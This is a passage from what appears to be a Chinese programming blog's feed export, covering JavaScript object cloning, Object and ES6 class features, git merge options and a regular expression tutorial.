&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  这种方式不能算严格意义上的深度克隆，并没有切断新对象与被克隆对象的联系，被克隆对象作为新对象的原型存在，虽然新对象的改变不会影响旧对象，但反之则不然！而且给新对象属性重新赋值的时候只是覆盖了原型中的属性，在历遍新对象的时候也会出现问题。这种方式问题重重，除了实现特殊目的可以酌情使用，通常情况应避免使用。</p>
</li>
<li><p>json序列化</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> newObj = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(obj));</span><br></pre></td></tr></table></figure>
<p>  这是我最喜欢的方式了！简短粗暴直接！但是最大的问题是，毕竟JSON只是一种数据格式所以这种方式只能克隆属性，不能克隆方法，方法在序列化以后就消失了。。。</p>
</li>
</ul>
<h2 id="一些Object的方法与需要注意的点"><a href="#一些Object的方法与需要注意的点" class="headerlink" title="一些Object的方法与需要注意的点"></a>一些Object的方法与需要注意的点</h2><h3 id="Object-自身的方法"><a href="#Object-自身的方法" class="headerlink" title="Object 自身的方法:"></a>Object 自身的方法:</h3><ul>
<li>设置属性，<code>Object.defineProperty(obj, prop, descriptor)</code> 根据 descriptor 定义 obj 的 prop 属性(值，是否可写可枚举可删除等)。<br><code>Object.getOwnPropertyDescriptor(obj, prop)</code> 返回 obj 的 prop 属性的描述。</li>
<li>使对象不可拓展，<code>Object.preventExtensions(obj)</code>，<code>obj</code> 将不能添加新的属性。<br>判断对像是否可拓展，<code>Object.isExtensible(obj)</code>。</li>
<li>密封一个对象，<code>Object.seal(obj)</code>，<code>obj</code> 将不可拓展且不能删除已有属性。<br>判断对象是否密封，<code>Object.isSealed(obj)</code>。</li>
<li>冻结对象，<code>Object.freeze(obj)</code> <code>obj</code> 将被密封且不可修改。<br>判断对象是否冻结，<code>Object.isFrozen(obj)</code>。</li>
<li>获取对象自身属性(包括不可枚举的)，<code>Object.getOwnPropertyNames(obj)</code>，返回 <code>obj</code> 所有自身属性组成的数组。<br>获取对象自身属性(不包括不可枚举的)，<code>Object.keys(obj)</code>，返回 <code>obj</code> 所有自身可枚举属性组成的数组。<br>当使用<code>for in</code>循环遍历对象的属性时，原型链上的所有可枚举属性都将被访问。<br>只关心对象本身时用<code>Object.keys(obj)</code>代替 <code>for in</code>，避免历遍原型链上的属性。</li>
<li>获取某对象的原型对象，<code>Object.getPrototypeOf(object)</code>，返回 <code>object</code> 的原型对象。<br>设置某对象的原型对象，<code>Object.setPrototypeOf(obj, prototype)</code>，<code>ES6</code> 新方法，设置 <code>obj</code> 的原型对象为 <code>prototype</code> ，该语句比较耗时。</li>
</ul>
<h3 id="Object-prototype-上的方法"><a href="#Object-prototype-上的方法" class="headerlink" title="Object.prototype 上的方法:"></a>Object.prototype 上的方法:</h3><ul>
<li>查对象上某个属性是否存在时(存在于本身而不是原型链中)，<code>obj.hasOwnProperty()</code> 是唯一可用的方法，他不会向上查找原型链，只在 <code>obj</code> 自身查找，返回布尔值。</li>
<li>检测某对象是否存在于参数对象的原型链中，<code>obj.isPrototypeOf(obj2)</code>，<code>obj</code> 是否在 <code>obj2</code> 的原型链中，返回布尔值。</li>
<li>检测某属性是否是对象自身的可枚举属性，<code>obj.propertyIsEnumerable(prop)</code>，返回布尔值。</li>
<li>对象类型，<code>obj.toString()</code>，返回 <code>&quot;[object type]&quot;</code> <code>type</code> 可以是 <code>Date</code>，<code>Array</code>，<code>Math</code> 等对象类型。</li>
<li><code>obj.valueOf()</code>,修改对象返回值时的行为，使用如下:<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myNumberType</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.number = n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myNumberType.prototype.valueOf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.number;</span><br><span class="line">&#125;;</span><br><span class="line">myObj = <span class="keyword">new</span> myNumberType(<span class="number">4</span>);</span><br><span class="line">myObj + <span class="number">3</span>; <span class="comment">// 7</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="ES6新增特性"><a href="#ES6新增特性" class="headerlink" title="ES6新增特性"></a>ES6新增特性</h2><ul>
<li>判断两个值是否完全相等，Object.is(value1, value2)，类似于 === 但是可以用来判断 NaN。</li>
<li><p>属性和方法简写:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 属性简写</span></span><br><span class="line"><span class="keyword">let</span> foo = <span class="string">'bar'</span>;</span><br><span class="line"><span class="keyword">let</span> baz = &#123;foo&#125;;</span><br><span class="line">baz; <span class="comment">// &#123;foo: "bar"&#125;</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">let</span> baz = &#123;<span class="attr">foo</span>: foo&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法简写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;x, y&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">x</span>: x, <span class="attr">y</span>: y&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// Object &#123;x: 1, y: 2&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>合并对象<br><code>Object.assign(target, [...source])</code>;将 <code>source</code> 中所有和枚举的属性复制到 <code>target</code>。<br>多个 source 对象有同名属性，后面的覆盖前面的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> target = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> source1 = &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> source2 = &#123;<span class="attr">c</span>: <span class="number">3</span>&#125;;</span><br><span class="line"><span class="built_in">Object</span>.assign(target, source1, source2);</span><br><span class="line">target; <span class="comment">// &#123;a:1, b:2, c:3&#125;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>注意一点，该命令执行的是浅克隆，如果 source 中有属性是对象，target 中会复制该对象的引用。<br>常用于给对象添加属性和方法(如给构造函数的原型添加方法)，克隆、合并对象等。</p>
<ul>
<li><p>获取对象自身的值或键值对(做为<code>Object.keys(obj)</code>的补充不包括不可枚举的):<br><code>Object.keys(obj)</code>返回 <code>obj</code> 自身所有可枚举属性的值组成的数组。<br><code>Object.entries(obj)</code>返回 <code>obj</code> 自身所有可枚举键值对数组组成的数组，例如:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>: <span class="string">'bar'</span>, <span class="attr">baz</span>: <span class="number">42</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.entries(obj)</span><br><span class="line"><span class="comment">// [ ["foo", "bar"], ["baz", 42] ]</span></span><br><span class="line"><span class="comment">// 可用于将对象转为 Map 结构</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>: <span class="string">'bar'</span>, <span class="attr">baz</span>: <span class="number">42</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">Object</span>.entries(obj));</span><br><span class="line">map <span class="comment">// Map &#123; foo: "bar", baz: 42 &#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>拓展运算符<code>...</code>:<br>取出对象所有可历遍属性，举例:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> z = &#123;<span class="attr">a</span>: <span class="number">3</span>, <span class="attr">b</span>: <span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> n = &#123;...z&#125;;</span><br><span class="line">n; <span class="comment">// &#123; a: 3, b: 4 &#125;</span></span><br><span class="line"><span class="comment">// 可代替 Object.assign()</span></span><br><span class="line"><span class="keyword">let</span> ab = &#123;...a, ...b&#125;;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">let</span> ab = <span class="built_in">Object</span>.assign(&#123;&#125;, a, b);</span><br></pre></td></tr></table></figure>
<p>可用于解构赋值中最后一个参数:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;x, y, ...z&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">2</span>, <span class="attr">a</span>: <span class="number">3</span>, <span class="attr">b</span>: <span class="number">4</span>&#125;;</span><br><span class="line">x; <span class="comment">// 1</span></span><br><span class="line">y; <span class="comment">// 2</span></span><br><span class="line">z; <span class="comment">// &#123; a: 3, b: 4 &#125;</span></span><br><span class="line"><span class="comment">// 可以这样理解，把 z 拆开以后就等于后面对象未被分配出去的键值对。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Null 传导运算符:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> firstName = message?.body?.user?.firstName || <span class="string">'default'</span>;</span><br><span class="line"><span class="comment">// 代替</span></span><br><span class="line"><span class="keyword">const</span> firstName = (message</span><br><span class="line">    &amp;&amp; message.body</span><br><span class="line">    &amp;&amp; message.body.user</span><br><span class="line">    &amp;&amp; message.body.user.firstName) || <span class="string">'default'</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>class:<br><code>ES6</code> 引入了 <code>class</code> 关键字，但并没有改变对象基于原型继承的原理，只是一个语法糖，让他长得像传统面向对象语言而已。<br>以下两个写法完全等价:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.x = x;</span><br><span class="line">    <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Point.prototype.toString = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'('</span> + <span class="keyword">this</span>.x + <span class="string">', '</span> + <span class="keyword">this</span>.y + <span class="string">')'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(x, y) &#123;</span><br><span class="line">        <span class="keyword">this</span>.x = x;</span><br><span class="line">        <span class="keyword">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    toString() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'('</span> + <span class="keyword">this</span>.x + <span class="string">', '</span> + <span class="keyword">this</span>.y + <span class="string">')'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类中定义的方法就是在原型上</span></span><br></pre></td></tr></table></figure>
<ul>
<li>有两点区别， <code>class</code> 中定义的方法是不可枚举的，<code>class</code> 必须通过 <code>new</code> 调用不能直接运行。<br><code>class</code> 不存在变量提升，使用要在定义之后。</li>
<li><p><code>class</code> 中的方法前加 <code>static</code> 关键字定义静态方法，只能通过 <code>class</code> 直接调用不能被实例继承。<br>如果静态方法包含 <code>this</code> 关键字，这个 <code>this</code> 指的是 <code>class</code>，而不是实例。注意下面代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> bar() &#123;</span><br><span class="line">        <span class="keyword">this</span>.baz();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> baz() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    baz() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'world'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.bar(); <span class="comment">// hello</span></span><br></pre></td></tr></table></figure>
<p>父类的静态方法，可以被子类继承，目前 <code>class</code> 内部无法定义静态属性。<br>设置静态属性与实例属性新提案:<br><code>class</code> 的实例属性可以用等式，写入类的定义之中。<br>静态属性直接前面加 <code>static</code> 即可。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    myProp = <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">static</span> myStaticProp = <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>class 的继承:<br><code>class</code> 通过 <code>extends</code> 实现继承,注意 <code>super</code> 关键字</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(x, y, color) &#123;</span><br><span class="line">        <span class="keyword">super</span>(x, y); <span class="comment">// 调用父类的constructor(x, y)</span></span><br><span class="line">        <span class="keyword">this</span>.color = color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    toString() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.color + <span class="string">' '</span> + <span class="keyword">super</span>.toString(); <span class="comment">// 调用父类的toString()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>extends</code> 可以继承其他类或任何有 <code>prototype</code> 属性的函数。<br>  <code>super</code> 会从父类获取各路信息绑定到子类的 <code>this</code>。<br>  子类自己没有 <code>this</code> 对象，要先继承父类的实例对象然后再进行加工，所以要在 <code>constructor</code> 里调用 <code>super</code> 继承 <code>this</code> 对象后才能使用 <code>this</code>。<br>  <code>ES5</code> 的继承，实质是先创造子类的实例对象 <code>this</code>，然后再将父类的方法添加到 <code>this</code> 上面（<code>Parent.apply(this)</code>）。<code>ES6</code> 的继承机制完全不同，实质是先创造父类的实例对象 <code>this</code>（所以必须先调用 <code>super</code> 方法创建和继承这个 <code>this</code>，并绑定到子类的 <code>this</code>），然后再用子类的构造函数修改<code>this</code>。<br>  这条理由也是造成了 <code>ES6</code> 之前无法继承原生的构造函数(<code>Array</code> <code>Function</code> <code>Date</code> 等)的原型对象，而使用 <code>class</code> 可以。因为 <code>ES5</code> 中的方法是先实例化子类，再把父类的属性添加上去，但是父类有很多不能直接访问的属性或方法，这就糟了，而通过 <code>class</code> 继承反其道而行之先实例化父类，这就自然把所有属性和方法都继承了。<br>  <code>super</code> 作为对象时，在普通方法中，指向父类的原型对象；在静态方法中，指向父类。<br>  通过 <code>super</code> 调用父类的方法时，<code>super</code> 会绑定子类的 <code>this</code>。<br>  <code>constructor</code> 方法会被默认添加:</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(...args) &#123;</span><br><span class="line">        <span class="keyword">super</span>(...args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>Object.getPrototypeOf(object)</code>，获取某对象的原型对象，也可以获取某类的原型类。</p>
</li>
<li><p><code>class</code> 的 <code>__proto__</code>与<code>prototype</code><br>子类的<code>__proto__</code>属性，表示构造函数的继承，总是指向父类。<br>子类<code>prototype</code>属性的<code>__proto__</code>属性，表示方法的继承，总是指向父类的 <code>prototype</code> 属性。<br>相当于子类本身继承父类，子类的原型对象继承自父类的原型对象。</p>
</li>
<li><p>new.target:<br>用在构造函数或者 <code>class</code> 内部，指向调用时 <code>new</code> 的构造函数或者 <code>class</code>。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>对象</tag>
      </tags>
  </entry>
  <entry>
    <title>Git-git常用命令与技巧</title>
    <url>/2018/04/17/Git-git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h2 id="git常用命令及技巧"><a href="#git常用命令及技巧" class="headerlink" title="git常用命令及技巧"></a>git常用命令及技巧</h2><h4 id="git-merge-–no-ff"><a href="#git-merge-–no-ff" class="headerlink" title="git merge –no-ff"></a>git merge –no-ff</h4><p>默认情况下，如果没有冲突那么 <code>git merge</code> 采用 <code>fast-forward</code>(快进) 的模式进行合并，所谓 <code>fast-forward</code> 指的是：不产生新的提交历史，直接移动 <code>HEAD</code> 至要合并的分支，显而易见的缺点是合并历史信息不清晰，如下图(一条线)：</p>
<p><img src="/static/img/git-merge.png" width="200"></p>
<p>所以为了保留分支的 <code>commit</code> 历史记录，我们可以采用 <code>--no-ff</code> 选项，这样合并后的历史记录图类似于这样：</p>
<p><img src="/static/img/git-merge-noff.png" width="200"></p>
<h4 id="git-merge-–squash"><a href="#git-merge-–squash" class="headerlink" title="git merge –squash"></a>git merge –squash</h4><p><code>--squash</code> 选项用于压缩多个“无用”的 <code>commit</code> 为一个 <code>commit</code>，效果类似下图：</p>
<p><img src="/static/img/git-merge-squash.png" width="200"></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA_正则表达式</title>
    <url>/2018/04/17/ECMA_%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>现在你已经知道几个很有用的元字符了，如<code>\b</code>,<code>.</code>,<code>*</code>，还有<code>\d</code>.正则表达式里还有更多的元字符，比如<code>\s</code>匹配任意的空白符，包括空格，制表符(Tab)，换行符，中文全角空格等。<code>\w</code>匹配字母或数字或下划线或汉字等。</p>
<p><code>\ba\w*\b</code>匹配以字母<code>a</code>开头的单词——先是某个单词开始处<code>(\b)</code>，然后是字母a,然后是任意数量的字母或数字<code>(\w*)</code>，最后是单词结束处<code>(\b)</code>。</p>
<p><code>\d+</code>匹配1个或更多连续的数字。这里的<code>+</code>是和<code>*</code>类似的元字符，不同的是<code>*</code>匹配重复任意次(可能是0次)，而<code>+</code>则匹配重复1次或更多次。</p>
<p><code>\b\w{6}\b</code> 匹配刚好6个字符的单词。</p>
<p>表1、常用的元字符</p>
<table>
<thead>
<tr>
<th>代码</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>.</td>
<td>匹配除换行符以外的任意字符</td>
</tr>
<tr>
<td>\w</td>
<td>匹配字母或数字或下划线或汉字</td>
</tr>
<tr>
<td>\s</td>
<td>匹配任意的空白符</td>
</tr>
<tr>
<td>\d</td>
<td>匹配数字</td>
</tr>
<tr>
<td>\b</td>
<td>匹配单词的开始或结束</td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串的开始</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串的结束</td>
</tr>
</tbody>
</table>
<p>元字符<code>^</code>（和数字6在同一个键位上的符号）和<code>$</code>都匹配一个位置，这和<code>\b</code>有点类似。<code>^</code>匹配你要用来查找的字符串的开头，<code>$</code>匹配结尾。这两个代码在验证输入的内容时非常有用，比如一个网站如果要求你填写的QQ号必须为5位到12位数字时，可以使用：<code>^\d{5,12}$</code>。</p>
<p>这里的<code>{5,12}</code>和前面介绍过的<code>{2}</code>是类似的，只不过<code>{2}</code>匹配只能不多不少重复2次，<code>{5,12}</code>则是重复的次数不能少于5次，不能多于12次，否则都不匹配。</p>
<p>因为使用了<code>^</code>和<code>$</code>，所以输入的整个字符串都要用来和<code>\d{5,12}</code>来匹配，也就是说整个输入必须是5到12个数字，因此如果输入的QQ号能匹配这个正则表达式的话，那就符合要求了。</p>
<p>和忽略大小写的选项类似，有些正则表达式处理工具还有一个处理多行的选项。如果选中了这个选项，<code>^</code>和<code>$</code>的意义就变成了匹配行的开始处和结束处。</p>
<h2 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h2><p>如果你想查找元字符本身的话，比如你查找<code>.</code>,或者<code>*</code>,就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用<code>\</code>来取消这些字符的特殊意义。因此，你应该使用<code>\.</code>和<code>\*</code>。当然，要查找<code>\</code>本身，你也得用<code>\\</code>.</p>
<p>例如：<code>deerchao\.net</code>匹配<code>deerchao.net</code>，<code>C:\\Windows</code>匹配<code>C:\Windows</code>。</p>
<h2 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h2><p>你已经看过了前面的<code>*</code>,<code>+</code>,<code>{2}</code>,<code>{5,12}</code>这几个匹配重复的方式了。下面是正则表达式中所有的限定符(指定数量的代码，例如<code>*</code>,<code>{5,12}</code>等)：</p>
<p>表2、常用的限定符</p>
<table>
<thead>
<tr>
<th>代码/语法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>重复零次或更多次</td>
</tr>
<tr>
<td>+</td>
<td>重复一次或更多次</td>
</tr>
<tr>
<td>?</td>
<td>重复零次或一次</td>
</tr>
<tr>
<td>{n}</td>
<td>重复n次</td>
</tr>
<tr>
<td>{n,}</td>
<td>重复n次或更多次</td>
</tr>
<tr>
<td>{n,m}</td>
<td>重复n到m次</td>
</tr>
</tbody>
</table>
<p>下面是一些使用重复的例子：</p>
<p><code>Windows\d+</code>匹配<code>Windows</code>后面跟1个或更多数字</p>
<p><code>^\w+</code>匹配一行的第一个单词(或整个字符串的第一个单词，具体匹配哪个意思得看选项设置)</p>
<h2 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h2><p>要想查找数字，字母或数字，空白是很简单的，因为已经有了对应这些字符集合的元字符，但是如果你想匹配没有预定义元字符的字符集合(比如元音字母a,e,i,o,u),应该怎么办？</p>
<p>很简单，你只需要在方括号里列出它们就行了，像<code>[aeiou]</code>就匹配任何一个英文元音字母，<code>[.?!]</code>匹配标点符号(.或?或!)。</p>
<p>我们也可以轻松地指定一个字符范围，像<code>[0-9]</code>代表的含意与<code>\d</code>就是完全一致的：一位数字；同理<code>[a-z0-9A-Z_]</code>也完全等同于<code>\w</code>（如果只考虑英文的话）。</p>
<p>下面是一个更复杂的表达式：<code>\(?0\d{2}[) -]?\d{8}</code>。</p>
<p>“<code>(</code>”和“<code>)</code>”也是元字符，后面的分组节里会提到，所以在这里需要使用转义。<br>这个表达式可以匹配几种格式的电话号码，像<code>(010)88886666</code>，或<code>022-22334455</code>，或<code>02912345678</code>等。我们对它进行一些分析吧：首先是一个转义字符<code>\(</code>,它能出现0次或1次(<code>?</code>),然后是一个0，后面跟着2个数字(<code>\d{2}</code>)，然后是<code>)</code>或<code>-</code>或空格中的一个，它出现1次或不出现(<code>?</code>)，最后是8个数字(<code>\d{8}</code>)。</p>
<h2 id="分枝条件"><a href="#分枝条件" class="headerlink" title="分枝条件"></a>分枝条件</h2><p>不幸的是，刚才那个表达式也能匹配<code>010)12345678</code>或<code>(022-87654321</code>这样的“不正确”的格式。要解决这个问题，我们需要用到<code>分枝条件</code>。正则表达式里的<code>分枝条件</code>指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用<code>|</code>把不同的规则分隔开。听不明白？没关系，看例子：</p>
<p><code>0\d{2}-\d{8}|0\d{3}-\d{7}</code>这个表达式能匹配两种以连字号分隔的电话号码：一种是三位区号，8位本地号(如<code>010-12345678</code>)，一种是4位区号，7位本地号(<code>0376-2233445</code>)。</p>
<p><code>\(0\d{2}\)[- ]?\d{8}|0\d{2}[- ]?\d{8}</code>这个表达式匹配3位区号的电话号码，其中区号可以用小括号括起来，也可以不用，区号与本地号间可以用连字号或空格间隔，也可以没有间隔。你可以试试用分枝条件把这个表达式扩展成也支持4位区号的。</p>
<p><code>\d{5}-\d{4}|\d{5}</code>这个表达式用于匹配美国的邮政编码。美国邮编的规则是5位数字，或者用连字号间隔的9位数字。之所以要给出这个例子是因为它能说明一个问题：<code>使用分枝条件时，要注意各个条件的顺序</code>。如果你把它改成<code>\d{5}|\d{5}-\d{4}</code>的话，那么就只会匹配5位的邮编(以及9位邮编的前5位)。原因是匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其它的条件了。</p>
<h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><p>我们已经提到了怎么重复单个字符（直接在字符后面加上限定符就行了）；但如果想要重复多个字符又该怎么办？你可以用小括号来指定子表达式(也叫做分组)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作(后面会有介绍)。</p>
<p><code>(\d{1,3}\.){3}\d{1,3}</code>是一个简单的IP地址匹配表达式。要理解这个表达式，请按下列顺序分析它：<code>\d{1,3}</code>匹配1到3位的数字，<code>(\d{1,3}\.){3}</code>匹配三位数字加上一个英文句号(这个整体也就是这个分组)重复3次，最后再加上一个一到三位的数字<code>(\d{1,3})</code>。</p>
<p>不幸的是，它也将匹配<code>256.300.888.999</code>这种不可能存在的IP地址。如果能使用算术比较的话，或许能简单地解决这个问题，但是正则表达式中并不提供关于数学的任何功能，所以只能使用冗长的分组，选择，字符类来描述一个正确的IP地址：<code>((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)</code>。</p>
<p>理解这个表达式的关键是理解<code>2[0-4]\d|25[0-5]|[01]?\d\d?</code>，这里我就不细说了，你自己应该能分析得出来它的意义。</p>
<h2 id="反义"><a href="#反义" class="headerlink" title="反义"></a>反义</h2><p>有时需要查找不属于某个能简单定义的字符类的字符。比如想查找除了数字以外，其它任意字符都行的情况，这时需要用到反义：</p>
<p>表3、常用的反义代码</p>
<table>
<thead>
<tr>
<th>代码/语法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>\W</td>
<td>匹配任意不是字母，数字，下划线，汉字的字符</td>
</tr>
<tr>
<td>\S</td>
<td>匹配任意不是空白符的字符</td>
</tr>
<tr>
<td>\D</td>
<td>匹配任意非数字的字符</td>
</tr>
<tr>
<td>\B</td>
<td>匹配不是单词开头或结束的位置</td>
</tr>
<tr>
<td>[^x]</td>
<td>匹配除了x以外的任意字符</td>
</tr>
<tr>
<td>[^aeiou]</td>
<td>匹配除了aeiou这几个字母以外的任意字符</td>
</tr>
</tbody>
</table>
<p>例子：<code>\S+</code>匹配不包含空白符的字符串。</p>
<p><code>&lt;a[^&gt;]+&gt;</code>匹配用尖括号括起来的以a开头的字符串。</p>
<h2 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h2><p>使用小括号指定一个子表达式后，匹配这个子表达式的文本(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。默认情况下，每个分组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。</p>
<p>后向引用用于重复搜索前面某个分组匹配的文本。例如，<code>\1</code>代表分组1匹配的文本。难以理解？请看示例：</p>
<p><code>\b(\w+)\b\s+\1\b</code>可以用来匹配重复的单词，像<code>go go</code>, 或者<code>kitty kitty</code>。这个表达式首先是一个单词，也就是单词开始处和结束处之间的多于一个的字母或数字(<code>\b(\w+)\b</code>)，这个单词会被捕获到编号为1的分组中，然后是1个或几个空白符(<code>\s+</code>)，最后是分组1中捕获的内容（也就是前面匹配的那个单词）(<code>\1</code>)。</p>
<p>你也可以自己指定子表达式的组名。要指定一个子表达式的组名，请使用这样的语法：<code>(?&lt;Word&gt;\w+)</code>(或者把尖括号换成’也行：<code>(?&#39;Word&#39;\w+)</code>),这样就把<code>\w+</code>的组名指定为<code>Word</code>了。要反向引用这个分组捕获的内容，你可以使用<code>\k&lt;Word&gt;</code>,所以上一个例子也可以写成这样：<code>\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b</code>。</p>
<p>使用小括号的时候，还有很多特定用途的语法。下面列出了最常用的一些：</p>
<p>表4、常用的分组语法</p>
<table>
<thead>
<tr>
<th>分组</th>
<th>代码/语法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>捕获</td>
<td>(exp)</td>
<td>匹配exp</td>
</tr>
<tr>
<td></td>
<td>(?&lt;name>exp)</td>
<td>匹配exp,并捕获文本到名称为name的组里，也可以写成(?’name’exp)</td>
</tr>
<tr>
<td></td>
<td>(?:exp)</td>
<td>匹配exp,不捕获匹配的文本，也不给此分组分配组号</td>
</tr>
<tr>
<td>零宽断言</td>
<td>(?=exp)</td>
<td>匹配exp前面的位置</td>
</tr>
